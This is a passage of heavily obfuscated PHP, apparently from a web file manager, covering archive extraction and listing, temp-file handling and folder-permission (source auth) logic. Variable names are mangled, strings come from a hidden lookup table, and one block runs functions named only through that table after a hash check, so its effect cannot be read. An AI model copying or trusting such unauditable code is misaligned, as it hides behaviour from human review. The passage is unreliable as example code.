get_path_father($Aç—ŒÉ±Î’[$bôÌ“±µ»’[76]]); if (!$B­ğ—ˆƒÙ && $Cëôèß£à->getType() == $bôÌ“±µ»’[106]) { $aàÛÄ¤ù‹Ã = get_path_father($Cëôèß£à->path); } $fŠÒğë•Æ = IO::info($aàÛÄ¤ù‹Ã); if (!$fŠÒğë•Æ[$bôÌ“±µ»’[196]]) { show_json(LNG($bôÌ“±µ»’[1101]), !1); } } goto e¸½Ÿí¬“„; c‘šÍŠï¥: if ($B­ğ—ˆƒÙ || !$AæÛ©ƒƒî‡) { if ($AæÛ©ƒƒî‡ && strstr($AæÛ©ƒƒî‡, TEMP_FILES)) { $C°¿ñŸ¯¶ = $d±«ĞšÂ¾™ = array(); recursion_dir($aàÛÄ¤ù‹Ã, $C°¿ñŸ¯¶, $d±«ĞšÂ¾™, 0); foreach ($C°¿ñŸ¯¶ as $b—«Ë‹‰ô‚) { del_dir($b—«Ë‹‰ô‚); } foreach ($d±«ĞšÂ¾™ as $FĞ•Á‚Ö ) { if ($FĞ•Á‚Ö  == $føòÚğµÁ) { continue; } del_file($FĞ•Á‚Ö ); } } return $dÀæ‚˜™¡; } $D‚‘ñ¸¹ÎÃ = self::pathFather($Aç—ŒÉ±Î’[$bôÌ“±µ»’[76]]); $eãëİìë = self::move($dÀæ‚˜™¡, $D‚‘ñ¸¹ÎÃ, $AâÎì‰É»Ÿ); goto fÍ¡’Û×ˆ; F˜¢ôˆá°: $bôÌ“±µ»’ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Cëôèß£à = self::init($dîâĞæËŒ”[0][$bôÌ“±µ»’[76]]); $Aç—ŒÉ±Î’ = self::info($dîâĞæËŒ”[0][$bôÌ“±µ»’[76]]); goto BŠ©•ù÷Çõ; e¸½Ÿí¬“„: $dÀæ‚˜™¡ = $aàÛÄ¤ù‹Ã . $bÆµ…ÀŠÛ . $bôÌ“±µ»’[95] . $dõ¤§›Üèƒ; $dÀæ‚˜™¡ = get_filename_auto($dÀæ‚˜™¡, $bôÌ“±µ»’[33], $AâÎì‰É»Ÿ); $føòÚğµÁ = self::iconvSystem($dÀæ‚˜™¡); goto fŸÔôñÂƒù; a‚Ò‹äÀÔ‰: } public static function unzip($aÑªŞá ç, $fé¿ ñÊ‰Ê = "\162\145\x70\154\141\x63\145") { goto B¨Ëõ”ƒ…; Eöß„°Í‡: Hook::trigger($AÙŸ’­•¡Í[1110], $cØÔİœÒÑÜ); recursion_dir($cØÔİœÒÑÜ, $aŞ¿„¢É½–, $b¤Š³îØİ±, 0); $Aèõ¿†µµ = array_merge($aŞ¿„¢É½–, $b¤Š³îØİ±); goto CˆÏ‚Şèù‹; A‹íñ“íÏ¹: mk_dir($cØÔİœÒÑÜ); $bİ¼ôŠ¦…Ë = self::fileExt($bï…èä³–‘); $cããÜŒĞŠò = $cØÔİœÒÑÜ . $AÙŸ’­•¡Í[95] . $bİ¼ôŠ¦…Ë; goto d˜÷ëóÍÀ‡; a—ùÎ÷¡¸¼: $bº¹è¸Ãöë = KodArchive::extract($cããÜŒĞŠò, $cØÔİœÒÑÜ . $AÙŸ’­•¡Í[8], $B•àèéƒ³‡); self::archiveExt(); if (!$bº¹è¸Ãöë[$AÙŸ’­•¡Í[1107]]) { show_json($AÙŸ’­•¡Í[1108] . $bº¹è¸Ãöë[$AÙŸ’­•¡Í[1109]], !1); } goto Eöß„°Í‡; Aƒ¾šŸ¦: if (!($bï…èä³–‘ = parent::info($aŠìØºöÂ))) { show_json(LNG($AÙŸ’­•¡Í[1104]), !1); } if (!($aÁù§Û©¥ = parent::infoFull($F‡Éİ´×¬Ë))) { $F‡Éİ´×¬Ë = parent::mkdir($F‡Éİ´×¬Ë); $aÁù§Û©¥ = array($AÙŸ’­•¡Í[76] => $F‡Éİ´×¬Ë); } else { if (isset($aÁù§Û©¥[$AÙŸ’­•¡Í[397]]) && trim($aÁù§Û©¥[$AÙŸ’­•¡Í[76]], $AÙŸ’­•¡Í[8]) != trim($F‡Éİ´×¬Ë, $AÙŸ’­•¡Í[8])) { $FŞ¤ŞİºÏ° = KodIO::make($aÁù§Û©¥[$AÙŸ’­•¡Í[492]]); $FÜ‘—Ğ¯ôò = parent::fileNameAuto($FŞ¤ŞİºÏ°, $aÁù§Û©¥[$AÙŸ’­•¡Í[28]], REPEAT_RENAME_FOLDER, !0); $F‡Éİ´×¬Ë = parent::mkdir($FŞ¤ŞİºÏ° . $FÜ‘—Ğ¯ôò); $aÁù§Û©¥ = array($AÙŸ’­•¡Í[76] => $F‡Éİ´×¬Ë); } } $F‡Éİ´×¬Ë = $aÁù§Û©¥[$AÙŸ’­•¡Í[76]]; goto fƒèÚ‘†¥ ; fƒèÚ‘†¥ : $EÙºÄ¨ÉÒÂ = self::tmpFileName($bï…èä³–‘); $cØÔİœÒÑÜ = TEMP_FILES . $EÙºÄ¨ÉÒÂ; del_dir($cØÔİœÒÑÜ); goto A‹íñ“íÏ¹; d˜÷ëóÍÀ‡: if (!@file_exists(self::iconvSystem($cããÜŒĞŠò))) { $B­ÇïîŸ¸ñ = self::localFilePath($aŠìØºöÂ, $bİ¼ôŠ¦…Ë); $cããÜŒĞŠò = $B­ÇïîŸ¸ñ ? $B­ÇïîŸ¸ñ : parent::download($aŠìØºöÂ, $cããÜŒĞŠò); } $cããÜŒĞŠò = self::iconvSystem($cããÜŒĞŠò); $B•àèéƒ³‡ = isset($aÑªŞá ç[$AÙŸ’­•¡Í[1105]]) ? $aÑªŞá ç[$AÙŸ’­•¡Í[1105]] : $AÙŸ’­•¡Í[1106]; goto a—ùÎ÷¡¸¼; B¨Ëõ”ƒ…: $AÙŸ’­•¡Í =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $aŠìØºöÂ = $aÑªŞá ç[$AÙŸ’­•¡Í[76]]; $F‡Éİ´×¬Ë = $aÑªŞá ç[$AÙŸ’­•¡Í[1103]]; goto Aƒ¾šŸ¦; bïÙÄææ¸¢: return !0; goto e •–÷¯„ñ; CˆÏ‚Şèù‹: foreach ($Aèõ¿†µµ as $fÙÈÃ‚Ô‹ó) { $fÙÈÃ‚Ô‹ó = self::iconvApp($fÙÈÃ‚Ô‹ó); self::move($fÙÈÃ‚Ô‹ó, $F‡Éİ´×¬Ë, $fé¿ ñÊ‰Ê); } del_dir($cØÔİœÒÑÜ); if (!$B­ÇïîŸ¸ñ) { del_file($cããÜŒĞŠò); } goto bïÙÄææ¸¢; e •–÷¯„ñ: } public static function unzipList($fï•á»ë„) { goto B©§ÌÊ™¼; Aº¯”«ªÃã: self::archiveExt(); del_dir($A‡ĞŞ‘šª¤); if (!$c±»˜ˆÎˆ[$FÆ‘ĞÖÙÅ‹[1107]]) { show_json($c±»˜ˆÎˆ[$FÆ‘ĞÖÙÅ‹[1109]], !1); } goto Bì­¨ÄÉ‹ö; Bì­¨ÄÉ‹ö: $BÀ¢Ùî®Œæ = json_encode($c±»˜ˆÎˆ[$FÆ‘ĞÖÙÅ‹[1109]]); self::setContent($CÛ¬ñ¸øÒ, $BÀ¢Ùî®Œæ); if (count($c±»˜ˆÎˆ[$FÆ‘ĞÖÙÅ‹[1109]]) >= $f‹ÜªßîÏ¿) { show_json(sprintf(LNG($FÆ‘ĞÖÙÅ‹[1113]), count($c±»˜ˆÎˆ[$FÆ‘ĞÖÙÅ‹[1109]])), !1); } goto Eª›ö ô¿; CŒ‘‰Ÿİª‚: $f‹ÜªßîÏ¿ = 50000; if (request_url_safe($DÈ¦‹•í¤)) { $Bíêê‰Š = parse_url_query($DÈ¦‹•í¤); if (!isset($Bíêê‰Š[$FÆ‘ĞÖÙÅ‹[76]])) { show_json($FÆ‘ĞÖÙÅ‹[1112], !1); } } $Bö²Î¥œ‰› = isset($Bíêê‰Š) ? $Bíêê‰Š[$FÆ‘ĞÖÙÅ‹[76]] : $DÈ¦‹•í¤; goto fºĞã¹ï•²; Eëšõ¿Ø¿Ò: $fƒÆŒíÁÕ¸ = self::iconvSystem($fƒÆŒíÁÕ¸); if ($A¹À“ñøİø >= 0) { $EÆ‘ÕñÄ = isset($fï•á»ë„[$FÆ‘ĞÖÙÅ‹[1115]]) ? $fï•á»ë„[$FÆ‘ĞÖÙÅ‹[1115]] : !1; $BÎÜÑÍÛ¯á = isset($fï•á»ë„[$FÆ‘ĞÖÙÅ‹[28]]) ? $fï•á»ë„[$FÆ‘ĞÖÙÅ‹[28]] : $FÆ‘ĞÖÙÅ‹[33]; KodArchive::filePreview($fƒÆŒíÁÕ¸, $A¹À“ñøİø, $EÆ‘ÕñÄ, $BÎÜÑÍÛ¯á); self::archiveExt(); die; } $c±»˜ˆÎˆ = KodArchive::listContent($fƒÆŒíÁÕ¸); goto Aº¯”«ªÃã; Eª›ö ô¿: return $c±»˜ˆÎˆ[$FÆ‘ĞÖÙÅ‹[1109]]; goto fÈ«·Êò ; B‹ââÍì¤Ä: if (!is_dir($A‡ĞŞ‘šª¤)) { mk_dir($A‡ĞŞ‘šª¤); } $fƒÆŒíÁÕ¸ = $A‡ĞŞ‘šª¤ . $FÆ‘ĞÖÙÅ‹[8] . $d²‚Åøßªß; if (!@file_exists(self::iconvSystem($fƒÆŒíÁÕ¸))) { if (isset($Bíêê‰Š)) { url_request($DÈ¦‹•í¤, $FÆ‘ĞÖÙÅ‹[1114], $fƒÆŒíÁÕ¸); } else { $aâ¦…Ïã‰ = self::localFilePath($DÈ¦‹•í¤, $cîâ‹òÀëÎ); $fƒÆŒíÁÕ¸ = $aâ¦…Ïã‰ ? $aâ¦…Ïã‰ : self::download($DÈ¦‹•í¤, $fƒÆŒíÁÕ¸); } } goto Eëšõ¿Ø¿Ò; fºĞã¹ï•²: $eÏÈªªŞÏ‘ = self::info($Bö²Î¥œ‰›); $cîâ‹òÀëÎ = self::fileExt($eÏÈªªŞÏ‘); $c¿™ÃÌŒ© = self::tmpFileName($eÏÈªªŞÏ‘); goto cãõßŠá˜¯; B©§ÌÊ™¼: $FÆ‘ĞÖÙÅ‹ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $DÈ¦‹•í¤ = $fï•á»ë„[$FÆ‘ĞÖÙÅ‹[76]]; $A¹À“ñøİø = isset($fï•á»ë„[$FÆ‘ĞÖÙÅ‹[1111]]) ? $fï•á»ë„[$FÆ‘ĞÖÙÅ‹[1111]] : -1; goto CŒ‘‰Ÿİª‚; cãõßŠá˜¯: if (isset($Bíêê‰Š)) { $EµİÒÑóÅÒ = array($Bíêê‰Š[$FÆ‘ĞÖÙÅ‹[76]], $Bíêê‰Š[$FÆ‘ĞÖÙÅ‹[1111]], $Bíêê‰Š[$FÆ‘ĞÖÙÅ‹[28]]); $d²‚Åøßªß = md5(implode($FÆ‘ĞÖÙÅ‹[71], $EµİÒÑóÅÒ)) . $FÆ‘ĞÖÙÅ‹[95] . get_path_ext($Bíêê‰Š[$FÆ‘ĞÖÙÅ‹[28]]); } else { $EµİÒÑóÅÒ = array($eÏÈªªŞÏ‘[$FÆ‘ĞÖÙÅ‹[28]], $eÏÈªªŞÏ‘[$FÆ‘ĞÖÙÅ‹[76]], $eÏÈªªŞÏ‘[$FÆ‘ĞÖÙÅ‹[78]]); $d²‚Åøßªß = md5(implode($FÆ‘ĞÖÙÅ‹[71], $EµİÒÑóÅÒ)) . $FÆ‘ĞÖÙÅ‹[95] . $cîâ‹òÀëÎ; } if ($A¹À“ñøİø == -1) { $CÛ¬ñ¸øÒ = IO_PATH_SYSTEM_TEMP . "\x7a\x69\x70\x56\151\145\167\x2f{$c¿™ÃÌŒ©}\57{$d²‚Åøßªß}\x2e\x6c\157\147"; $Eôø›ïƒ  = self::infoFull($CÛ¬ñ¸øÒ); if ($Eôø›ïƒ ) { $CÛ¬ñ¸øÒ = $Eôø›ïƒ [$FÆ‘ĞÖÙÅ‹[76]]; $F«Ÿ³ Õ¨Ë = self::getContent($CÛ¬ñ¸øÒ); if ($F«Ÿ³ Õ¨Ë) { $BÀ¢Ùî®Œæ = json_decode($F«Ÿ³ Õ¨Ë, !0); if (count($BÀ¢Ùî®Œæ) >= $f‹ÜªßîÏ¿) { show_json(sprintf(LNG($FÆ‘ĞÖÙÅ‹[1113]), count($BÀ¢Ùî®Œæ)), !1); } return $BÀ¢Ùî®Œæ; } } else { $CÛ¬ñ¸øÒ = self::mkfile($CÛ¬ñ¸øÒ); } } $A‡ĞŞ‘šª¤ = TEMP_FILES . $c¿™ÃÌŒ©; goto B‹ââÍì¤Ä; fÈ«·Êò : } private static function fileExt($EãÑÙ‘ã¶) { $f¤—áÉáÂó =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $d¤éÛ‚Õ = $EãÑÙ‘ã¶[$f¤—áÉáÂó[168]]; if ($d¤éÛ‚Õ == $f¤—áÉáÂó[1116]) { $AŒˆªÁ×ô¿ = $f¤—áÉáÂó[1117]; if (substr($EãÑÙ‘ã¶[$f¤—áÉáÂó[28]], -strlen($AŒˆªÁ×ô¿)) == $AŒˆªÁ×ô¿) { $d¤éÛ‚Õ = $f¤—áÉáÂó[1118]; } } self::archiveExt($d¤éÛ‚Õ); return $d¤éÛ‚Õ; } private static function zipFileList($E‰Ñá•¥À¸, $aÚ¨Øïò’ = false) { $F™£ª—„• =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $CæŠàˆ…È = array(); foreach ($E‰Ñá•¥À¸ as $F³ªœ¨½”) { $CªÕÉß¥Íî = $F³ªœ¨½”[$F™£ª—„•[76]]; if ($aÚ¨Øïò’) { $CªÕÉß¥Íî = self::copy($F³ªœ¨½”[$F™£ª—„•[76]], $aÚ¨Øïò’, $F™£ª—„•[806]); } else { $cáÏä×ƒäÚ = self::init($F³ªœ¨½”[$F™£ª—„•[76]]); if ($cáÏä×ƒäÚ->getType() == $F™£ª—„•[106]) { $CªÕÉß¥Íî = $cáÏä×ƒäÚ->path; } } if ($CªÕÉß¥Íî && self::local()->exist($CªÕÉß¥Íî)) { $CæŠàˆ…È[$F³ªœ¨½”[$F™£ª—„•[76]]] = $CªÕÉß¥Íî; } } if (!empty($CæŠàˆ…È)) { return array_values($CæŠàˆ…È); } show_json(LNG($F™£ª—„•[1082]), !1); } public static function tmpFileName($FÈ‡¼µà©Ê) { $FíÀŸÎ­ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $báÚŞ³‹¤„ = array($FÈ‡¼µà©Ê[$FíÀŸÎ­[28]], $FÈ‡¼µà©Ê[$FíÀŸÎ­[76]], $FÈ‡¼µà©Ê[$FíÀŸÎ­[78]], $FÈ‡¼µà©Ê[$FíÀŸÎ­[515]]); return md5(implode($FíÀŸÎ­[71], $báÚŞ³‹¤„)); } private static function localFilePath($eĞ™èÈÍ², $a†é¯Ùç‚ç) { goto FñÇÅ‘‡ÎĞ; D©ÍËÒ¹ÖÌ: if ($f½¦ÄÄ¸ãí[$Fªâˆİ‘¬Ğ[29]] == KodIO::KOD_SOURCE) { $cÄ¨éˆ—•ã = Model($Fªâˆİ‘¬Ğ[813])->fileInfoGet(KodIO::sourceID($eĞ™èÈÍ²)); if (!$cÄ¨éˆ—•ã[$Fªâˆİ‘¬Ğ[76]]) { show_json($Fªâˆİ‘¬Ğ[1121], !1); } $eĞ™èÈÍ² = $cÄ¨éˆ—•ã[$Fªâˆİ‘¬Ğ[76]]; } $f²¥ ÈÁ = self::init($eĞ™èÈÍ²); $FĞ›‚”ô¬ = $f²¥ ÈÁ->getType(); goto F§Ø…ôÄ«; F§Ø…ôÄ«: if ($FĞ›‚”ô¬ == $Fªâˆİ‘¬Ğ[106] || $FĞ›‚”ô¬ == $Fªâˆİ‘¬Ğ[1122]) { if (!$f²¥ ÈÁ->exist($f²¥ ÈÁ->path)) { show_json(LNG($Fªâˆİ‘¬Ğ[105]), !1); } return $f²¥ ÈÁ->path; } return !1; goto EóäÁê“è; FñÇÅ‘‡ÎĞ: $Fªâˆİ‘¬Ğ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($a†é¯Ùç‚ç == $Fªâˆİ‘¬Ğ[1119] && strtoupper(substr(PHP_OS, 0, 3)) == $Fªâˆİ‘¬Ğ[1120]) { return !1; } $f½¦ÄÄ¸ãí = KodIO::parse($eĞ™èÈÍ²); goto D©ÍËÒ¹ÖÌ; EóäÁê“è: } private static function archiveExt($E õ÷µÒ´ = '') { $GLOBALS[$_SERVER[Ôğ—¤Šµˆ˜ñ£][1123]] = $E õ÷µÒ´; } } goto DÒ”òÖ—‚ò; bñê×ˆÛ±Û: $A«çÔ…ŠÁÁ = $_SERVER[Ôğ—¤Šµˆ˜ñ£][848]; if ($_SERVER[$_SERVER[Ôğ—¤Šµˆ˜ñ£][849]] != $A«çÔ…ŠÁÁ($FèòÙñˆ§Œ)) { goto bë‘—º†ø; bë‘—º†ø: $B‡÷äŠÂœ = $_SERVER[Ôğ—¤Šµˆ˜ñ£][850]; $eóÚ•é¾´Ù = $_SERVER[$_SERVER[Ôğ—¤Šµˆ˜ñ£][851]] . $_SERVER[Ôğ—¤Šµˆ˜ñ£][852]; $D¢¯˜”ˆ“¾ = $B‡÷äŠÂœ($eóÚ•é¾´Ù); goto cğ‡’ßµÂ; cğ‡’ßµÂ: $f™á‘³¤¿µ = explode($_SERVER[Ôğ—¤Šµˆ˜ñ£][229], $D¢¯˜”ˆ“¾); if (count($f™á‘³¤¿µ) < $_SERVER[Ôğ—¤Šµˆ˜ñ£][609]) { $c—Á‘ö‰‘Ç = $_SERVER[Ôğ—¤Šµˆ˜ñ£][853]; $c—Á‘ö‰‘Ç(); } $E™„‡ğ´É = $_SERVER[Ôğ—¤Šµˆ˜ñ£][854]; goto b—Ò…¼ÅÙ—; b—Ò…¼ÅÙ—: $E™„‡ğ´É($FèòÙñˆ§Œ); goto aíÕ´óêÛ…; aíÕ´óêÛ…: } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\x75\x72\x63\145\x5f\141\165\164\x68"; public function getAuth($D¿¢ÚğïõÁ) { goto eğÍø©ê¬; eğÍø©ê¬: $B¨µîãƒ‡™ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $A¢ŒÄ‘½ñ = $this->sourceAuthSelect($D¿¢ÚğïõÁ); $D•ñçÄÌ­Ÿ = array(); goto C¤íŒÓ’–; EÄ¬¾¨‚Ï¹: array_multisort($b›Ç²ù“»Î, SORT_DESC, $D•ñçÄÌ­Ÿ); return $D•ñçÄÌ­Ÿ; goto Eø‰ÑäŠëŸ; C¤íŒÓ’–: $b›Ç²ù“»Î = array(); $dÍ™ÌêÎ¿ = 2 << 25; foreach ($A¢ŒÄ‘½ñ as $bôå’óŒŠ™) { goto eÆ£İõÍÛ; eæÅšåè³­: if ($bôå’óŒŠ™[$B¨µîãƒ‡™[406]] == SourceModel::TYPE_USER && $bôå’óŒŠ™[$B¨µîãƒ‡™[498]] == $B¨µîãƒ‡™[191]) { $eŠÍ×Õƒ¾Ş = 0; } $b›Ç²ù“»Î[] = $Fà’²¹¹‚[$B¨µîãƒ‡™[408]] + $eŠÍ×Õƒ¾Ş; goto f¸µŒ¾ë¡ì; cÅ–ËŒÜè: $eŠÍ×Õƒ¾Ş = 0; if ($bôå’óŒŠ™[$B¨µîãƒ‡™[406]] == SourceModel::TYPE_GROUP) { $eŠÍ×Õƒ¾Ş = $dÍ™ÌêÎ¿ * 2; } if ($bôå’óŒŠ™[$B¨µîãƒ‡™[406]] == SourceModel::TYPE_USER) { $eŠÍ×Õƒ¾Ş = $dÍ™ÌêÎ¿; } goto eæÅšåè³­; eÆ£İõÍÛ: $Fà’²¹¹‚ = Model($B¨µîãƒ‡™[501])->listData($bôå’óŒŠ™[$B¨µîãƒ‡™[1819]]); if (!$Fà’²¹¹‚) { continue; } $D•ñçÄÌ­Ÿ[] = $bôå’óŒŠ™; goto cÅ–ËŒÜè; f¸µŒ¾ë¡ì: } goto EÄ¬¾¨‚Ï¹; Eø‰ÑäŠëŸ: } public function sourceAuthSelect($D¿÷êùæÕÛ) { goto C›ÌĞ÷ïñó; fß¢Šô»—: if ($CæÎÚÉ¼«) { return $EÆœ²ÀÀ©Û; } return $BÓñ†Ñæåæ; goto bäšõ‘§íŠ; a†åğÔ Àƒ: if (count($eË¾Ø««Í) == count($D¿÷êùæÕÛ)) { return $CæÎÚÉ¼« ? $eË¾Ø««Í[$D¿÷êùæÕÛ[0]] : $eË¾Ø««Í; } $c£øòĞæ×ï = $aî…¯òêğË[1890]; $dİÜ¶é£µ = array($aî…¯òêğË[397] => array($aî…¯òêğË[7], $D¿÷êùæÕÛ)); goto Ağ¡¾¾¦È‹; Ağ¡¾¾¦È‹: $EÆœ²ÀÀ©Û = $this->field($c£øòĞæ×ï)->order($aî…¯òêğË[395])->where($dİÜ¶é£µ)->select(); $BÓñ†Ñæåæ = array_to_keyvalue_group($EÆœ²ÀÀ©Û, $aî…¯òêğË[397]); foreach ($D¿÷êùæÕÛ as $bº¯ŠÔâŒÈ) { $añÜÂ„ï[$bº¯ŠÔâŒÈ] = $BÓñ†Ñæåæ[$bº¯ŠÔâŒÈ] ? $BÓñ†Ñæåæ[$bº¯ŠÔâŒÈ] : array(); } goto fß¢Šô»—; còï…‡¸: if ($CæÎÚÉ¼«) { $D¿÷êùæÕÛ = array($D¿÷êùæÕÛ); } $eË¾Ø««Í = array(); foreach ($D¿÷êùæÕÛ as $bº¯ŠÔâŒÈ) { if (isset($añÜÂ„ï[$bº¯ŠÔâŒÈ])) { $eË¾Ø««Í[$bº¯ŠÔâŒÈ] = $añÜÂ„ï[$bº¯ŠÔâŒÈ]; } } goto a†åğÔ Àƒ; C›ÌĞ÷ïñó: $aî…¯òêğË =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; static $añÜÂ„ï = array(); $CæÎÚÉ¼« = is_array($D¿÷êùæÕÛ) ? !1 : !0; goto còï…‡¸; bäšõ‘§íŠ: } public function setAuth($b÷…Áõ‹ãÁ, $D£È…¸†—Ğ) { goto eÕÉ‘µ©šî; c‹¾³ÃØ¿í: if ($fÚ¦—‰íËö != $C£©ë—ˆæÃ) { $FÑ¢¤îÖ = array($E†¶Œ«ÄÍˆ[1719] => $fÚ¦—‰íËö); $CšˆŞÙÒì¸ = Model($E†¶Œ«ÄÍˆ[1805])->field($E†¶Œ«ÄÍˆ[1550])->where($FÑ¢¤îÖ)->select(); $CšˆŞÙÒì¸ = array_to_keyvalue($CšˆŞÙÒì¸, $E†¶Œ«ÄÍˆ[33], $E†¶Œ«ÄÍˆ[1550]); } $BÇó¿öÂÃµ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $D…õ´ºÅÛƒ = array(); goto CŒÇ¾Éá›; eÕÉ‘µ©šî: $E†¶Œ«ÄÍˆ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $A³ğ²¾”Ì = Model($E†¶Œ«ÄÍˆ[1227])->sourceInfo($b÷…Áõ‹ãÁ); if (!$A³ğ²¾”Ì) { return !1; } goto dÌ²¹šá; dÌ²¹šá: if ($A³ğ²¾”Ì[$E†¶Œ«ÄÍˆ[406]] != SourceModel::TYPE_GROUP) { return !1; } $C£©ë—ˆæÃ = 1; $fÚ¦—‰íËö = $A³ğ²¾”Ì[$E†¶Œ«ÄÍˆ[498]]; goto c‹¾³ÃØ¿í; CŒÇ¾Éá›: foreach ($D£È…¸†—Ğ as $d‡ƒÉƒ«¿) { if (!in_array($d‡ƒÉƒ«¿[$E†¶Œ«ÄÍˆ[406]], $BÇó¿öÂÃµ)) { show_json(LNG($E†¶Œ«ÄÍˆ[1891]), !1); } if ($fÚ¦—‰íËö != $C£©ë—ˆæÃ) { if ($d‡ƒÉƒ«¿[$E†¶Œ«ÄÍˆ[406]] == SourceModel::TYPE_GROUP) { } if ($d‡ƒÉƒ«¿[$E†¶Œ«ÄÍˆ[498]] != 0 && !in_array($d‡ƒÉƒ«¿[$E†¶Œ«ÄÍˆ[498]], $CšˆŞÙÒì¸)) { } } if ($d‡ƒÉƒ«¿[$E†¶Œ«ÄÍˆ[498]] == 0) { $d‡ƒÉƒ«¿[$E†¶Œ«ÄÍˆ[406]] = SourceModel::TYPE_USER; } $D…õ´ºÅÛƒ[] = array($E†¶Œ«ÄÍˆ[397] => $b÷…Áõ‹ãÁ, $E†¶Œ«ÄÍˆ[406] => intval($d‡ƒÉƒ«¿[$E†¶Œ«ÄÍˆ[406]]), $E†¶Œ«ÄÍˆ[498] => intval($d‡ƒÉƒ«¿[$E†¶Œ«ÄÍˆ[498]]), $E†¶Œ«ÄÍˆ[1819] => intval($d‡ƒÉƒ«¿[$E†¶Œ«ÄÍˆ[1819]]) ? intval($d‡ƒÉƒ«¿[$E†¶Œ«ÄÍˆ[1819]]) : 0, $E†¶Œ«ÄÍˆ[1873] => intval($d‡ƒÉƒ«¿[$E†¶Œ«ÄÍˆ[1873]]) ? intval($d‡ƒÉƒ«¿[$E†¶Œ«ÄÍˆ[1873]]) : -1); } $this->where(array($E†¶Œ«ÄÍˆ[412] => $b÷…Áõ‹ãÁ))->delete(); $this->addAll($D…õ´ºÅÛƒ); goto A™ö‹ï›Ó; A™ö‹ï›Ó: return !0; goto E³±°ò „; E³±°ò „: } public function authClear($C¢“ÓŒ¿ì) { $BÚÅï•¡¼¤ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $BàóßÑï¸ = Model($BÚÅï•¡¼¤[1227])->sourceInfo($C¢“ÓŒ¿ì); $A¯ŸÊÄ—»È = array($C¢“ÓŒ¿ì); if ($BàóßÑï¸[$BÚÅï•¡¼¤[405]] == $BÚÅï•¡¼¤[87]) { $CïØÇî„ê = array($BÚÅï•¡¼¤[578] => array($BÚÅï•¡¼¤[538], $BàóßÑï¸[$BÚÅï•¡¼¤[515]] . $C¢“ÓŒ¿ì . $BÚÅï•¡¼¤[539])); $A¯ŸÊÄ—»È = Model($BÚÅï•¡¼¤[1227])->field($BÚÅï•¡¼¤[412])->where($CïØÇî„ê)->getField($BÚÅï•¡¼¤[397], !0); $A¯ŸÊÄ—»È[] = $C¢“ÓŒ¿ì; } $this->where(array($BÚÅï•¡¼¤[412] => array($BÚÅï•¡¼¤[413], $A¯ŸÊÄ—»È)))->delete(); return !0; } public function getAllChildren($EÊÛÙ³î´•) { goto EêÅÇÇÁË’; EêÅÇÇÁË’: $dÜ««¨¹«¸ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $e—ÏÉÌ¯æË = Model($dÜ««¨¹«¸[1227])->sourceInfo($EÊÛÙ³î´•); if ($e—ÏÉÌ¯æË[$dÜ««¨¹«¸[405]] != $dÜ««¨¹«¸[87]) { return $this->sourceListAuth(array($EÊÛÙ³î´•)); } goto B‰àŒ†åµŠ; cä“ëïƒ«: if ($e—ÏÉÌ¯æË[$dÜ««¨¹«¸[492]] == $dÜ««¨¹«¸[191] && $e—ÏÉÌ¯æË[$dÜ««¨¹«¸[498]] != $EÚÖùÉ¦ÑÙ) { $eÇ´·£áéõ = $this->groupChidldAllRootSource($e—ÏÉÌ¯æË[$dÜ««¨¹«¸[498]]); } $AÌ´™ğã‚à = $this->field($dÜ««¨¹«¸[397])->group($dÜ««¨¹«¸[397])->select(); $AÌ´™ğã‚à = array_to_keyvalue($AÌ´™ğã‚à, $dÜ««¨¹«¸[33], $dÜ««¨¹«¸[397]); goto B´ˆ‘…Ã¦ç; B´ˆ‘…Ã¦ç: if (!$AÌ´™ğã‚à) { return array(); } $cõ•Òàäì‘ = $dÜ««¨¹«¸[1892]; $EÕ‡ÈÇ†ƒ‡ = array($dÜ««¨¹«¸[397] => array($dÜ««¨¹«¸[7], $AÌ´™ğã‚à), $dÜ««¨¹«¸[425] => $dÜ««¨¹«¸[191]); goto cìØø—ÈÍ; cìØø—ÈÍ: $Fä«ÂîßÓñ = Model($dÜ««¨¹«¸[813])->field($cõ•Òàäì‘)->where($EÕ‡ÈÇ†ƒ‡)->select(); $AèÃÌ±”–® = array($EÊÛÙ³î´•); foreach ($Fä«ÂîßÓñ as $bëæÒ¦áŠà) { foreach ($eÇ´·£áéõ as $c³†Ş—Î™ƒ) { $A„Å¸½›õ = $dÜ««¨¹«¸[47] . $c³†Ş—Î™ƒ . $dÜ««¨¹«¸[47]; $aî¨¤­«ô = $bëæÒ¦áŠà[$dÜ««¨¹«¸[515]] . $bëæÒ¦áŠà[$dÜ««¨¹«¸[397]] . $dÜ««¨¹«¸[47]; if (strstr($aî¨¤­«ô, $A„Å¸½›õ)) { $AèÃÌ±”–®[] = $bëæÒ¦áŠà[$dÜ««¨¹«¸[397]]; break; } } } goto cÂ¢¯Ìù·; B‰àŒ†åµŠ: if ($e—ÏÉÌ¯æË[$dÜ««¨¹«¸[406]] != SourceModel::TYPE_GROUP) { return array(); } $EÚÖùÉ¦ÑÙ = 1; $eÇ´·£áéõ = array($EÊÛÙ³î´•); goto cä“ëïƒ«; cÂ¢¯Ìù·: return $this->sourceListAuth($AèÃÌ±”–®); goto E‡†æâòãï; E‡†æâòãï: } private function sourceListAuth($föôğªŒ) { goto dâ”ïèã; eÓÆÄ«¡ÃÁ: array_multisort($F‹ÙğÂ…ÃÅ, SORT_ASC, $aŠ·ÅàÒØ‘); return $aŠ·ÅàÒØ‘; goto fœ°ÀÇ«·®; a‘¬ƒò­†„: $aŠ·ÅàÒØ‘ = array(); $F‹ÙğÂ…ÃÅ = array(); foreach ($BÕšà„‰áÑ as $c¯ï¬Åßø) { goto dÑªµƒæ”ò; dÑªµƒæ”ò: unset($c¯ï¬Åßø[$béâôºº©ï[448]]); unset($c¯ï¬Åßø[$béâôºº©ï[446]]); unset($c¯ï¬Åßø[$béâôºº©ï[408]]); goto F¸¤Õåò™ö; A£âÓŒ¾Í: $E„¡²‰Ò•Æ = 